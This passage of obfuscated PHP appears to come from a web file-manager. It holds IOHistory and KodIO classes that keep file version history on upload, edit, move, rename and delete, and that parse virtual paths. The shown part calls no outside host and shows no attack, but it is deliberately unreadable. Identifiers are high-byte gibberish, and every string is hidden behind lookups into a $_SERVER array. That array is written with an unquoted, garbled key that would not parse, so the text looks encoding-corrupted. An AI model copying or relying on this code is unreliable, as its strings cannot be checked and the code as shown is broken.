str_ireplace($şşš©¬Ö[58], $şşš©¬Ö[59], $¤Á¿ê´); } public function parseLimit($—Ö•çÈ‚) { $£œÄÂÄ =& $_SERVER[® ¨Ä®ñ]; $èÚ¶š¨¬ = $£œÄÂÄ[12]; if (!empty($—Ö•çÈ‚)) { $—Ö•çÈ‚ = explode($£œÄÂÄ[50], $—Ö•çÈ‚); if (count($—Ö•çÈ‚) > 1) { $èÚ¶š¨¬ .= $£œÄÂÄ[51] . $—Ö•çÈ‚[1] . $£œÄÂÄ[52] . $—Ö•çÈ‚[0] . $£œÄÂÄ[53]; } else { $èÚ¶š¨¬ .= $£œÄÂÄ[51] . $—Ö•çÈ‚[0] . $£œÄÂÄ[53]; } } return $èÚ¶š¨¬; } } goto cì£¿íõÄ; e´˜ƒÂ¿Íˆ: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $´¦øŸ½¨ =& $_SERVER[® ¨Ä®ñ]; $³«á¹‘ = $GLOBALS[$´¦øŸ½¨[6]][$´¦øŸ½¨[90]]; if ($³«á¹‘[$´¦øŸ½¨[1190]] != 1) { return; } if ($³«á¹‘[$´¦øŸ½¨[1191]] <= 0) { return; } if (isset($_REQUEST[$´¦øŸ½¨[1192]]) && $_REQUEST[$´¦øŸ½¨[1192]] == $´¦øŸ½¨[89]) { return; } Hook::bind($´¦øŸ½¨[1193], $´¦øŸ½¨[1194]); Hook::bind($´¦øŸ½¨[1195], $´¦øŸ½¨[1196]); Hook::bind($´¦øŸ½¨[1197], $´¦øŸ½¨[1198]); Hook::bind($´¦øŸ½¨[1199], $´¦øŸ½¨[1200]); Hook::bind($´¦øŸ½¨[1201], $´¦øŸ½¨[1202]); Hook::bind($´¦øŸ½¨[1203], $´¦øŸ½¨[1204]); } public static function eventBeforeUpload($êâ¹İ‡) { if ($êâ¹İ‡[3] && $êâ¹İ‡[3] != REPEAT_REPLACE) { return; } $œŒÈàâ = self::parsePath($êâ¹İ‡[0]); if (!$œŒÈàâ) { return; } self::add($œŒÈàâ); } public static function eventBeforeEdit($êîªçöí) { $×€š§Ø = self::parsePath($êîªçöí[0]); if (!$×€š§Ø) { return; } self::add($×€š§Ø); } public static function eventBeforeCopyFile($Ï¨Àš¯Ş, $Èéàë, $ ÏÉç½§, $æÎ¡Šò, $·¿©Ñ‚¬, $ğ±»«¢Ì) { $ò„õÑÕ = $ ÏÉç½§->getPathOuter($æÎ¡Šò); $ªë±† = self::parsePath($ò„õÑÕ); if (!$ªë±†) { return; } self::add($ªë±†); } public static function eventBeforeRename($ø’ş•àï) { $•¶ğ…‘ =& $_SERVER[® ¨Ä®ñ]; $¬´ÔãŸè = self::parsePath($ø’ş•àï[0]); if (!$¬´ÔãŸè) { return; } $‹Ë§ü = self::checkInHistory($¬´ÔãŸè); if (!$‹Ë§ü) { return; } if ($‹Ë§ü[$•¶ğ…‘[33]] == $•¶ğ…‘[192]) { $ÖÒêºß€ = self::listData($¬´ÔãŸè); if ($ÖÒêºß€ && $ÖÒêºß€[$•¶ğ…‘[364]]) { self::moveHistory($¬´ÔãŸè, $ø’ş•àï[1]); } } else { IO::rename($‹Ë§ü[$•¶ğ…‘[78]], $ø’ş•àï[1]); } } public static function eventBeforeMove($ Šó©Û€) { $ôªá¦Ğ =& $_SERVER[® ¨Ä®ñ]; $Ç„Éñ“é = self::parsePath($ Šó©Û€[0]); if (!$Ç„Éñ“é) { return; } $ïÙùÏÙÊ = self::parsePath($ Šó©Û€[1]); if (!$ïÙùÏÙÊ) { return; } $íÉŸúªÂ = $ Šó©Û€[3]; $Œµ’ƒõš = self::checkInHistory($Ç„Éñ“é); if (!$Œµ’ƒõš) { return; } $¢ú­ÃŠš = self::pathHistory($ïÙùÏÙÊ); if ($Œµ’ƒõš[$ôªá¦Ğ[33]] == $ôªá¦Ğ[192]) { $÷ï„»  = self::listData($Ç„Éñ“é); $ÖğƒÙ‚¼ = rtrim($ïÙùÏÙÊ, $ôªá¦Ğ[8]) . $ôªá¦Ğ[8] . ($íÉŸúªÂ ? $íÉŸúªÂ : get_path_this($Ç„Éñ“é)); $ Ë€Òø¹ = self::listData($ÖğƒÙ‚¼); if ($÷ï„»  && $÷ï„» [$ôªá¦Ğ[364]] && $ Ë€Òø¹ && $ Ë€Òø¹[$ôªá¦Ğ[364]]) { return self::clear($Ç„Éñ“é); } if ($÷ï„»  && $÷ï„» [$ôªá¦Ğ[364]]) { self::moveHistory($Ç„Éñ“é, $íÉŸúªÂ, $¢ú­ÃŠš); } } else { IO::move($Œµ’ƒõš[$ôªá¦Ğ[78]], $¢ú­ÃŠš, !1, $íÉŸúªÂ); self::clearEmptyFolder(IO::pathFather($Œµ’ƒõš[$ôªá¦Ğ[78]])); } } public static function eventAfterRemove($éŒ€¦É, $ÛÊ’Öœ‹) { $²É®àüü =& $_SERVER[® ¨Ä®ñ]; if (!$ÛÊ’Öœ‹) { return; } $¶ßè = self::parsePath($éŒ€¦É[0]); if (!$¶ßè) { return; } $Êá¢±Á‡ = self::checkInHistory($¶ßè); if (!$Êá¢±Á‡) { return; } if ($Êá¢±Á‡[$²É®àüü[33]] == $²É®àüü[192]) { $‹ãÆ©ÚÌ = self::listData($¶ßè, !1); if ($‹ãÆ©ÚÌ && $‹ãÆ©ÚÌ[$²É®àüü[364]]) { self::clear($¶ßè, !1); } } else { IO::remove($Êá¢±Á‡[$²É®àüü[78]]); self::clearEmptyFolder(IO::pathFather($Êá¢±Á‡[$²É®àüü[78]])); } } private static function checkInHistory($ŒÈÉ¡İÙ) { $íË®åõÓ = self::pathHistory($ŒÈÉ¡İÙ); if (!IO::exist($íË®åõÓ)) { $íË®åõÓ .= $_SERVER[® ¨Ä®ñ][1205]; } return IO::exist($íË®åõÓ) ? IO::info($íË®åõÓ) : !1; } private static function parsePath($»Ã§É±) { $¨î…şä =& $_SERVER[® ¨Ä®ñ]; if (!$»Ã§É±) { return !1; } if ($GLOBALS[$¨î…şä[1206]]) { return; } $¶©¢¦¬Œ = KodIO::parse($»Ã§É±); $æ–âğçÉ = $¶©¢¦¬Œ[$¨î…şä[33]]; $œ ïõÊÍ = !$æ–âğçÉ || $æ–âğçÉ == KodIO::KOD_IO || $æ–âğçÉ == KodIO::KOD_SHARE_ITEM; if (!$œ ïõÊÍ || !$¶©¢¦¬Œ[$¨î…şä[1207]]) { return !1; } if (substr($»Ã§É±, 0, strlen(DATA_PATH . $¨î…şä[1208])) == DATA_PATH . $¨î…şä[1208]) { return !1; } if ($æ–âğçÉ == KodIO::KOD_SHARE_ITEM) { $şÒºËéº = IO::init($»Ã§É±); if ($şÒºËéº->pathParse[$¨î…şä[1135]]) { return self::parsePath($şÒºËéº->pathParse[$¨î…şä[1135]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $ûÔ¶’• = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $¨î…şä[1209]); foreach ($ûÔ¶’• as $Ç¹ôÑŞ) { if (!$æ–âğçÉ && substr($»Ã§É±, 0, strlen($Ç¹ôÑŞ)) == $Ç¹ôÑŞ) { return !1; } } self::log($GLOBALS[$¨î…şä[1130]] . $¨î…şä[1210] . $»Ã§É±); return $»Ã§É±; } private static function pathHistory($ÇÔÔÊ’¡) { $ˆ±óûïÖ =& $_SERVER[® ¨Ä®ñ]; $çÇ†ƒµ = self::$_historyBase . ltrim(KodIO::clear($ÇÔÔÊ’¡), $ˆ±óûïÖ[8]); $çÇ†ƒµ = str_replace(array($ˆ±óûïÖ[1211]), array($ˆ±óûïÖ[1212]), $çÇ†ƒµ); return $çÇ†ƒµ; } public static function log($Ş•àø¨) { } public static function historyCount($§ÚÔ±) { $„î©ğ =& $_SERVER[® ¨Ä®ñ]; $°¡ÚÍ› = array(); $•¿çáÓØ = array(); foreach ($§ÚÔ± as $ÎîÌÒ‘„) { $Ûâ°Ä« = get_path_father($ÎîÌÒ‘„); if (!$•¿çáÓØ[$Ûâ°Ä«]) { $•¿çáÓØ[$Ûâ°Ä«] = array(); } $•¿çáÓØ[$Ûâ°Ä«][] = get_path_this($ÎîÌÒ‘„); } foreach ($•¿çáÓØ as $Ûâ°Ä« => $çûä†É) { $Ö¶µ‘ = self::parsePath($Ûâ°Ä«); if (!$Ö¶µ‘) { continue; } foreach ($çûä†É as $å£©ˆõé) { $µú¢ÇıÌ = self::listData(rtrim($Ö¶µ‘, $„î©ğ[8]) . $„î©ğ[8] . $å£©ˆõé, !1); if ($µú¢ÇıÌ && $µú¢ÇıÌ[$„î©ğ[364]]) { $°¡ÚÍ›[rtrim($Ûâ°Ä«, $„î©ğ[8]) . $„î©ğ[8] . $å£©ˆõé] = count($µú¢ÇıÌ[$„î©ğ[364]]); } } } return $°¡ÚÍ›; } public static function add($ü¾Êš¤Õ) { $±œ¿ø¨† =& $_SERVER[® ¨Ä®ñ]; $»ñÂÎı… = self::listData($ü¾Êš¤Õ); if (!$»ñÂÎı…) { return; } $Š÷—¹ = Model($±œ¿ø¨†[752])->get($±œ¿ø¨†[1213]); $È†®á³¸ = $GLOBALS[$±œ¿ø¨†[6]][$±œ¿ø¨†[90]][$±œ¿ø¨†[1191]]; $ñı³î® = $Š÷—¹ == $±œ¿ø¨†[1214] ? 5 : $È†®á³¸; if ($È†®á³¸ <= 0) { return; } $©ûÆÑî¹ = IO::hashSimple($ü¾Êš¤Õ); $Òü ÀãÁ = IO::info($ü¾Êš¤Õ); $–ÃÓªÛß = $»ñÂÎı…[$±œ¿ø¨†[364]]; if ($Òü ÀãÁ[$±œ¿ø¨†[80]] == 0) { return; } if ($Òü ÀãÁ[$±œ¿ø¨†[80]] >= 1024 * 1024 * 500) { return !1; } if ($–ÃÓªÛß && $–ÃÓªÛß[0][$±œ¿ø¨†[170]] == $©ûÆÑî¹) { return !0; } if (array_key_exists($±œ¿ø¨†[195], $Òü ÀãÁ) && !$Òü ÀãÁ[$±œ¿ø¨†[195]]) { return !1; } $ ®È¥ñ§ = short_id(time()); $¨Ï£è®à = array($±œ¿ø¨†[392] => $ ®È¥ñ§, $±œ¿ø¨†[170] => $©ûÆÑî¹, $±œ¿ø¨†[32] => $Òü ÀãÁ[$±œ¿ø¨†[32]] . $±œ¿ø¨†[10] . date($±œ¿ø¨†[1215]) . rand_string(1), $±œ¿ø¨†[80] => $Òü ÀãÁ[$±œ¿ø¨†[80]], $±œ¿ø¨†[443] => USER_ID, $±œ¿ø¨†[193] => time(), $±œ¿ø¨†[1216] => $±œ¿ø¨†[12]); IO::mkdir($»ñÂÎı…[$±œ¿ø¨†[1217]]); $ãí¨ß¼ş = IO::copy($ü¾Êš¤Õ, $»ñÂÎı…[$±œ¿ø¨†[1217]], !1, $¨Ï£è®à[$±œ¿ø¨†[32]]); if (!$ãí¨ß¼ş) { self::clearEmptyFolder($»ñÂÎı…[$±œ¿ø¨†[1217]]); return !1; } array_unshift($–ÃÓªÛß, $¨Ï£è®à); if (count($–ÃÓªÛß) > $ñı³î®) { $İæêª“  = array_slice($–ÃÓªÛß, $ñı³î®); foreach ($İæêª“  as $Ê™ÒõÎ×) { IO::remove($»ñÂÎı…[$±œ¿ø¨†[1217]] . $Ê™ÒõÎ×[$±œ¿ø¨†[32]]); } $–ÃÓªÛß = array_slice($–ÃÓªÛß, 0, $ñı³î®); } return self::saveData($»ñÂÎı…[$±œ¿ø¨†[1218]], $–ÃÓªÛß); } public static function remove($÷­·ˆÆŞ, $æîû„š) { $êÇüœ î =& $_SERVER[® ¨Ä®ñ]; $ÉÙï‚ş¯ = self::listData($÷­·ˆÆŞ); $Ìƒ„ùç° = array(); if (!$ÉÙï‚ş¯) { return !1; } foreach ($ÉÙï‚ş¯[$êÇüœ î[364]] as $¥â¾™Ê„) { if ($¥â¾™Ê„[$êÇüœ î[392]] == $æîû„š) { IO::remove($ÉÙï‚ş¯[$êÇüœ î[1217]] . $¥â¾™Ê„[$êÇüœ î[32]]); continue; } $Ìƒ„ùç°[] = $¥â¾™Ê„; } return self::saveData($ÉÙï‚ş¯[$êÇüœ î[1218]], $Ìƒ„ùç°); } public static function clear($»Œ˜ŒÒ´, $Á”å¦ã = true) { $ù¶Øæá =& $_SERVER[® ¨Ä®ñ]; $Î¥ó®¹ = self::listData($»Œ˜ŒÒ´, $Á”å¦ã); if (!$Î¥ó®¹) { return !1; } foreach ($Î¥ó®¹[$ù¶Øæá[364]] as $ñ»Ùàíš) { IO::remove($Î¥ó®¹[$ù¶Øæá[1217]] . $ñ»Ùàíš[$ù¶Øæá[32]]); } return self::saveData($Î¥ó®¹[$ù¶Øæá[1218]], array()); } public static function moveHistory($É”½üÌ¯, $À×¹éü = '', $±å–ó = '') { $ÇâÖ ¼” =& $_SERVER[® ¨Ä®ñ]; $åƒªĞã¸ = self::listData($É”½üÌ¯, !1); if (!$åƒªĞã¸ || !$åƒªĞã¸[$ÇâÖ ¼”[364]]) { return !1; } $§ùœ¹è‡ = $ÇâÖ ¼”[1205]; $À×¹éü = $À×¹éü ? $À×¹éü : get_path_this($É”½üÌ¯); $±å–ó = $±å–ó ? $±å–ó : $åƒªĞã¸[$ÇâÖ ¼”[1217]]; $ÆŒøâó× = substr(get_path_this($åƒªĞã¸[$ÇâÖ ¼”[1218]]), 0, -strlen($§ùœ¹è‡)); foreach ($åƒªĞã¸[$ÇâÖ ¼”[364]] as $Ã¢Êµøà => $èºÆã…†) { $²½Ü…Ò´ = $À×¹éü . substr($èºÆã…†[$ÇâÖ ¼”[32]], strlen($ÆŒøâó×)); $òêº¢Ô’ = IO::move($åƒªĞã¸[$ÇâÖ ¼”[1217]] . $èºÆã…†[$ÇâÖ ¼”[32]], $±å–ó, !1, $²½Ü…Ò´); if ($òêº¢Ô’) { $åƒªĞã¸[$ÇâÖ ¼”[364]][$Ã¢Êµøà][$ÇâÖ ¼”[32]] = $²½Ü…Ò´; } } $åƒªĞã¸[$ÇâÖ ¼”[1218]] = IO::move($åƒªĞã¸[$ÇâÖ ¼”[1218]], $±å–ó, !1, $À×¹éü . $§ùœ¹è‡); self::saveData($åƒªĞã¸[$ÇâÖ ¼”[1218]], $åƒªĞã¸[$ÇâÖ ¼”[364]]); self::clearEmptyFolder($åƒªĞã¸[$ÇâÖ ¼”[1217]]); } public static function rollback($ÉáÍ¯î, $Ÿ„³·Í·) { $Üúó¢ş =& $_SERVER[® ¨Ä®ñ]; $Š¦º…¾î = self::listData($ÉáÍ¯î); if (!$Š¦º…¾î) { return; } $¹¢’¯ºæ = IO::info($ÉáÍ¯î); foreach ($Š¦º…¾î[$Üúó¢ş[364]] as $á”¥Ñ”© => $Ê½®º¥Á) { if ($Ê½®º¥Á[$Üúó¢ş[392]] == $Ÿ„³·Í·) { self::add($ÉáÍ¯î); $é²Œ‡©” = $Š¦º…¾î[$Üúó¢ş[1217]] . $Ê½®º¥Á[$Üúó¢ş[32]]; $Ö¢ÊÉ¢Ï = IO::copy($é²Œ‡©”, IO::pathFather($ÉáÍ¯î), REPEAT_REPLACE, $¹¢’¯ºæ[$Üúó¢ş[32]]); if ($Ö¢ÊÉ¢Ï) { self::remove($ÉáÍ¯î, $Ÿ„³·Í·); } return $Ö¢ÊÉ¢Ï; } } return !1; } public static function setDetail($¸ı£‹ßÛ, $ÂúõĞÆ—, $ş›®¹òØ) { $Â›ššãæ =& $_SERVER[® ¨Ä®ñ]; $´úÕã…‚ = self::listData($¸ı£‹ßÛ); if (!$´úÕã…‚) { return; } foreach ($´úÕã…‚[$Â›ššãæ[364]] as $ªÔÓç => $‹çÏç°È) { if ($‹çÏç°È[$Â›ššãæ[392]] == $ÂúõĞÆ—) { $´úÕã…‚[$Â›ššãæ[364]][$ªÔÓç][$Â›ššãæ[1216]] = $ş›®¹òØ; self::saveData($´úÕã…‚[$Â›ššãæ[1218]], $´úÕã…‚[$Â›ššãæ[364]]); return !0; } } return !1; } public static function fileInfo($É¤Â, $ÉŠúáŸù) { $”†ıï  =& $_SERVER[® ¨Ä®ñ]; $İëÍ†÷Ê = self::listData($É¤Â); if (!$İëÍ†÷Ê) { show_json(LNG($”†ıï [106]), !1); } $Ã­ˆ§œò = $”†ıï [12]; foreach ($İëÍ†÷Ê[$”†ıï [364]] as $¦¬ìä¯¸ => $¯ÉüËŸÖ) { if ($¯ÉüËŸÖ[$”†ıï [392]] != $ÉŠúáŸù) { continue; } $Ã­ˆ§œò = $İëÍ†÷Ê[$”†ıï [1217]] . $¯ÉüËŸÖ[$”†ıï [32]]; break; } if (!$Ã­ˆ§œò) { show_json(LNG($”†ıï [106]), !1); } return IO::info($Ã­ˆ§œò); } public static function fileOut($´ÂéÙš”, $§Ë˜Ûîâ, $Òğê¹î™ = false) { $ÒøÚµîø =& $_SERVER[® ¨Ä®ñ]; $ ĞµÙÅÇ = self::fileInfo($´ÂéÙš”, $§Ë˜Ûîâ); $“á“Ãï¡ =& $GLOBALS[$ÒøÚµîø[7]]; $Òğê¹î™ = isset($“á“Ãï¡[$ÒøÚµîø[1181]]) && $“á“Ãï¡[$ÒøÚµîø[1181]] == 1; if (isset($“á“Ãï¡[$ÒøÚµîø[33]]) && $“á“Ãï¡[$ÒøÚµîø[33]] == $ÒøÚµîø[1219]) { return IO::fileOutImage($ ĞµÙÅÇ[$ÒøÚµîø[78]], $“á“Ãï¡[$ÒøÚµîø[1220]]); } IO::fileOut($ ĞµÙÅÇ[$ÒøÚµîø[78]], $Òğê¹î™, get_path_this($´ÂéÙš”)); } public static function listData($ĞÃ‚Ù­­, $›„²øÈŸ = true) { $×ºÑ Œ¡ =& $_SERVER[® ¨Ä®ñ]; if ($›„²øÈŸ && !IO::exist($ĞÃ‚Ù­­)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($ĞÃ‚Ù­­, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $ß ÉÎæ = self::pathHistory($ĞÃ‚Ù­­); $¬è¾‡¿Ô = array($×ºÑ Œ¡[1218] => $ß ÉÎæ . $×ºÑ Œ¡[1205], $×ºÑ Œ¡[1217] => rtrim(get_path_father($ß ÉÎæ), $×ºÑ Œ¡[8]) . $×ºÑ Œ¡[8], $×ºÑ Œ¡[364] => array()); $€ŞÁ½·ü = IO::getContent($¬è¾‡¿Ô[$×ºÑ Œ¡[1218]]); if ($€ŞÁ½·ü) { $‚ƒü¼Â½ = json_decode($€ŞÁ½·ü, !0); if (is_array($‚ƒü¼Â½)) { $¬è¾‡¿Ô[$×ºÑ Œ¡[364]] = $‚ƒü¼Â½; } } return $¬è¾‡¿Ô; } private static function saveData($‡ˆê¨²ñ, $¯Å»»¸Š) { $•úØ± =& $_SERVER[® ¨Ä®ñ]; self::log($•úØ±[1221] . $‡ˆê¨²ñ . $•úØ±[71] . count($¯Å»»¸Š), $•úØ±[734]); if ($¯Å»»¸Š) { return IO::setContent($‡ˆê¨²ñ, json_encode($¯Å»»¸Š)); } $»¢Ï¹¤Ü = IO::pathFather($‡ˆê¨²ñ); IO::remove($‡ˆê¨²ñ); self::clearEmptyFolder($»¢Ï¹¤Ü); return !0; } public static function clearEmptyFolder($æ£ˆ¬ Õ) { $¡’èÜ”æ =& $_SERVER[® ¨Ä®ñ]; if (trim($æ£ˆ¬ Õ, $¡’èÜ”æ[8]) == trim(self::$_historyBase, $¡’èÜ”æ[8])) { return; } $Õºç÷Ãõ = IO::pathFather($æ£ˆ¬ Õ); $Ê«»êÉ = IO::has($æ£ˆ¬ Õ, !0); if ($Ê«»êÉ[$¡’èÜ”æ[202]] > 0 || $Ê«»êÉ[$¡’èÜ”æ[203]] > 0) { return; } IO::remove($æ£ˆ¬ Õ); self::clearEmptyFolder($Õºç÷Ãõ); } private static function getBasePath() { $¼ŞÚø =& $_SERVER[® ¨Ä®ñ]; $‚¼üë÷¿ = Model($¼ŞÚø[1222])->get($¼ŞÚø[1223]); if ($‚¼üë÷¿) { if (!IO::exist($‚¼üë÷¿)) { IO::mkdir($‚¼üë÷¿); } if (get_path_this($‚¼üë÷¿) == $¼ŞÚø[1208]) { $ƒó¦ŠŞÔ = $¼ŞÚø[1224] . rand_string(8); @rename($‚¼üë÷¿, get_path_father($‚¼üë÷¿) . $¼ŞÚø[8] . $ƒó¦ŠŞÔ); $‚¼üë÷¿ = DATA_PATH . $ƒó¦ŠŞÔ . $¼ŞÚø[8]; file_put_contents(DATA_PATH . $¼ŞÚø[1225], $¼ŞÚø[12]); Model($¼ŞÚø[1222])->set($¼ŞÚø[1223], $‚¼üë÷¿); } return $‚¼üë÷¿; } $‚¼üë÷¿ = DATA_PATH . $¼ŞÚø[1224] . rand_string(8) . $¼ŞÚø[8]; $‚¼üë÷¿ = IO::mkdir($‚¼üë÷¿); $‚¼üë÷¿ = rtrim($‚¼üë÷¿, $¼ŞÚø[8]) . $¼ŞÚø[8]; file_put_contents($‚¼üë÷¿ . $¼ŞÚø[1225], $¼ŞÚø[12]); file_put_contents(DATA_PATH . $¼ŞÚø[1225], $¼ŞÚø[12]); Model($¼ŞÚø[1222])->set($¼ŞÚø[1223], $‚¼üë÷¿); return $‚¼üë÷¿; } } class KodIO { const KOD_SOURCE = "\x7b\x73\157\165\162\143\x65\x7d"; const KOD_USER_RECYCLE = "\x7b\x75\x73\145\x72\122\x65\143\171\143\154\x65\175"; const KOD_USER_FAV = "\173\x75\x73\x65\162\x46\141\166\175"; const KOD_USER_FILE_TAG = "\173\x75\163\x65\162\x46\x69\x6c\145\x54\141\147\175"; const KOD_USER_FILE_TYPE = "\x7b\x75\163\145\162\106\x69\154\145\x54\171\x70\x65\175"; const KOD_GROUP_ROOT_SELF = "\173\x67\x72\157\x75\x70\122\x6f\x6f\x74\123\145\x6c\146\x7d"; const KOD_USER_SHARE = "\173\165\163\x65\x72\x53\x68\x61\x72\x65\175"; const KOD_USER_SHARE_LINK = "\173\165\x73\145\x72\x53\150\x61\162\x65\x4c\151\156\153\175"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\x68\x61\x72\x65\x54\x6f\x4d\145\x7d"; const KOD_SHARE_ITEM = "\173\163\150\x61\162\x65\x49\164\x65\155\175"; const KOD_SHARE_LINK = "\x7b\163\150\141\x72\145\x49\x74\x65\155\x4c\151\156\153\x7d"; const KOD_SEARCH = "\x7b\x73\x65\141\x72\143\x68\175"; const KOD_BLOCK = "\173\x62\x6c\x6f\x63\153\x7d"; const KOD_IO = "\173\151\157\175"; const KOD_USER_RECENT = "\x7b\165\163\145\162\x52\x65\x6e\x63\145\x6e\164\x7d"; const KOD_USER_DRIVER = "\x7b\144\162\x69\166\145\x72\x7d"; public static function typeList() { $Å¤…Ìœõ =& $_SERVER[® ¨Ä®ñ]; return array($Å¤…Ìœõ[1226] => self::KOD_SOURCE, $Å¤…Ìœõ[1227] => self::KOD_USER_RECYCLE, $Å¤…Ìœõ[1228] => self::KOD_USER_FAV, $Å¤…Ìœõ[1229] => self::KOD_USER_FILE_TAG, $Å¤…Ìœõ[1230] => self::KOD_USER_FILE_TYPE, $Å¤…Ìœõ[1231] => self::KOD_GROUP_ROOT_SELF, $Å¤…Ìœõ[1232] => self::KOD_USER_SHARE, $Å¤…Ìœõ[1233] => self::KOD_USER_SHARE_LINK, $Å¤…Ìœõ[1234] => self::KOD_USER_SHARE_TO_ME, $Å¤…Ìœõ[1235] => self::KOD_SHARE_ITEM, $Å¤…Ìœõ[1236] => self::KOD_SHARE_LINK, $Å¤…Ìœõ[1237] => self::KOD_SEARCH, $Å¤…Ìœõ[1238] => self::KOD_BLOCK, $Å¤…Ìœõ[1239] => self::KOD_IO, $Å¤…Ìœõ[1240] => self::KOD_USER_RECENT, $Å¤…Ìœõ[1241] => self::KOD_USER_DRIVER); } public static function parse($ÀØæ¿¢) { $ç§Ë¿ºœ =& $_SERVER[® ¨Ä®ñ]; $ÀØæ¿¢ = self::clear($ÀØæ¿¢); $À¦İƒò¡ = array_values(self::typeList()); preg_match($ç§Ë¿ºœ[1242], $ÀØæ¿¢, $àÍÙ­š‘); $´Õ¾œÛª = array($ç§Ë¿ºœ[414] => !1, $ç§Ë¿ºœ[1243] => !1, $ç§Ë¿ºœ[411] => !1, $ç§Ë¿ºœ[78] => $ÀØæ¿¢, $ç§Ë¿ºœ[1152] => !1, $ç§Ë¿ºœ[1151] => $ç§Ë¿ºœ[12]); if (is_array($àÍÙ­š‘) && count($àÍÙ­š‘) == 5) { $ÖÂÅ²¸¥ = $ç§Ë¿ºœ[1244] . $àÍÙ­š‘[2] . $ç§Ë¿ºœ[322]; if (in_array($ÖÂÅ²¸¥, $À¦İƒò¡)) { $´Õ¾œÛª[$ç§Ë¿ºœ[1152]] = $àÍÙ­š‘[1]; $´Õ¾œÛª[$ç§Ë¿ºœ[33]] = $ÖÂÅ²¸¥; $´Õ¾œÛª[$ç§Ë¿ºœ[1245]] = substr($ÖÂÅ²¸¥, 1, -1); $´Õ¾œÛª[$ç§Ë¿ºœ[392]] = $àÍÙ­š‘[3]; } $´Õ¾œÛª[$ç§Ë¿ºœ[1151]] = $àÍÙ­š‘[4]; } $÷Ş½ = array($ç§Ë¿ºœ[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $´Õ¾œÛª[$ç§Ë¿ºœ[1207]] = in_array($´Õ¾œÛª[$ç§Ë¿ºœ[33]], $÷Ş½); return $´Õ¾œÛª; } public static function isTruePath($ƒñ¤ÂŸş) { $¡Äµ² =& $_SERVER[® ¨Ä®ñ]; if (substr($ƒñ¤ÂŸş, 0, 1) != $¡Äµ²[1244]) { return !0; } if (strpos($ƒñ¤ÂŸş, $¡Äµ²[400]) === 0) { return !0; } if (strpos($ƒñ¤ÂŸş, $¡Äµ²[1211]) === 0) { return !0; } if (strpos($ƒñ¤ÂŸş, $¡Äµ²[1246]) === 0) { return !0; } if (strpos($ƒñ¤ÂŸş, $¡Äµ²[1247]) === 0) { return !0; } if (strpos($ƒñ¤ÂŸş, $¡Äµ²[1248]) === 0) { return !0; } return !1; } public static function clear($¡¤Ä¥¿í) { $ºÆş±ìí =& $_SERVER[® ¨Ä®ñ]; $¡¤Ä¥¿í = str_replace(array($ºÆş±ìí[1062], $ºÆş±ìí[226]), $ºÆş±ìí[53], $¡¤Ä¥¿í); $¡¤Ä¥¿í = str_replace($ºÆş±ìí[98], $ºÆş±ìí[8], $¡¤Ä¥¿í); $¾Áá×ñ = $ºÆş±ìí[1249]; if (substr($¡¤Ä¥¿í, 0, 3) == $ºÆş±ìí[1250]) { $¡¤Ä¥¿í = substr($¡¤Ä¥¿í, 3); } while (strstr($¡¤Ä¥¿í, $¾Áá×ñ)) { $¡¤Ä¥¿í = str_replace($¾Áá×ñ, $ºÆş±ìí[8], $¡¤Ä¥¿í); } $¡¤Ä¥¿í = preg_replace($ºÆş±ìí[1251], $ºÆş±ìí[8], $¡¤Ä¥¿í); if ($¡¤Ä¥¿í == $ºÆş±ìí[8]) { return $ºÆş±ìí[8]; } $¡¤Ä¥¿í = rtrim($¡¤Ä¥¿í, $ºÆş±ìí[8]); return $¡¤Ä¥¿í; } public static function sourceID($’÷ÎÈÚê) { $…Û¨Åí =& $_SERVER[® ¨Ä®ñ]; $Ñ‚ÏàÉ = self::parse($’÷ÎÈÚê); if ($Ñ‚ÏàÉ[$…Û¨Åí[33]] !== self::KOD_SOURCE) { show_json(LNG($…Û¨Åí[1252]), !1); } return $Ñ‚ÏàÉ[$…Û¨Åí[392]]; } public static function make($×ù™Ü½) { if (!$×ù™Ü½) { return !1; } return self::makePath(self::KOD_SOURCE, intval($×ù™Ü½)); } public static function makeShare($ìÚ¨Û¡, $Êû¹£¼§) { return self::makePath(self::KOD_SHARE_ITEM, $ìÚ¨Û¡, $Êû¹£¼§); } public static function makeFileTypePath($Èƒó“Ñ€) { return self::makePath(self::KOD_USER_FILE_TYPE, $Èƒó“Ñ€); } public static function makeFileTagPath($·à…»Õ ) { return self::makePath(self::KOD_USER_FILE_TAG, $·à…»Õ ); } public static function makePath($ï¿È±ÇÔ, $šËØ˜ŠÚ = '', $½ä¿—ôš = '') { $€æ¸¿ÏÚ =& $_SERVER[® ¨Ä®ñ]; $ø‚†ı¨Ç = substr($ï¿È±ÇÔ, 1, -1); $õØƒğœ“ = $€æ¸¿ÏÚ[1253] . $ø‚†ı¨Ç . $€æ¸¿ÏÚ[1254] . $šËØ˜ŠÚ . $€æ¸¿ÏÚ[1255]; $õØƒğœ“ = $½ä¿—ôš ? $õØƒğœ“ . $½ä¿—ôš . $€æ¸¿ÏÚ[8] : $õØƒğœ“; return $õØƒğœ“; } public static function hashPath($Çüü’, $ğËê¯ì = true) { $§•è‹« =& $_SERVER[® ¨Ä®ñ]; $ü¤œÎ¼ = is_array($Çüü’) ? $Çüü’ : IO::info($Çüü’); $¨ªë•Ñ = _get($ü¤œÎ¼, $§•è‹«[1256], $§•è‹«[12]); if (!$¨ªë•Ñ && isset($ü¤œÎ¼[$§•è‹«[394]])) { $ü¤œÎ¼ = IO::info(KodIO::make($ü¤œÎ¼[$§•è‹«[394]])); $¨ªë•Ñ = _get($ü¤œÎ¼, $§•è‹«[1256], $§•è‹«[12]); } if (!$¨ªë•Ñ && $ğËê¯ì) { $ĞÏÜÍ€ = KodIO::parse($ü¤œÎ¼[$§•è‹«[78]]); if (!$ĞÏÜÍ€[$§•è‹«[33]]) { $¨ªë•Ñ = IO::hashSimple($ü¤œÎ¼[$§•è‹«[78]]); } } if (!$¨ªë•Ñ) { $¨ªë•Ñ = md5($ü¤œÎ¼[$§•è‹«[78]] . $ü¤œÎ¼[$§•è‹«[80]] . $ü¤œÎ¼[$§•è‹«[86]]); } return $¨ªë•Ñ; } public static function initSystemPath() { $ÛÚõŞı =& $_SERVER[® ¨Ä®ñ]; if 